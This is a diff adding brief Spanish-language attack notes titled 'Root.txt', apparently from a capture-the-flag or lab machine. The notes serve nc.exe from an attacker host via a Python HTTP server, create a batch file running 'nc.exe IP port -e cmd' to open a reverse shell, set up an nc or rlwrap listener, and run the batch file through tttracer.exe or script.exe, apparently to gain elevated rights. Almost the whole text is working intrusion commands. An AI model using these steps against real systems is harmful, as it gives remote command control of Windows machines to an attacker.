@@ -1,0 +1,12 @@
+Root.txt
+
+Instalar nc.exe:
+    python3 -m http.server
+    En el buscador: 192.168.56.1:8000 y descargar
+
+Crear lalala.bat:
+C:\PATH\nc.exe IP port -e cmd
+
+En terminal: nc -lvp PORT, tambien se puede usar rlwrap: rlwrap nc -lvp PORT, de esta forma podremos hacer control + L.
+(tttracer.exe C:\path\lalala.bat) -> poner como comando original
+C:\Windows\System32\script.exe -ArgumentList 'C:\path\lalala.bat'
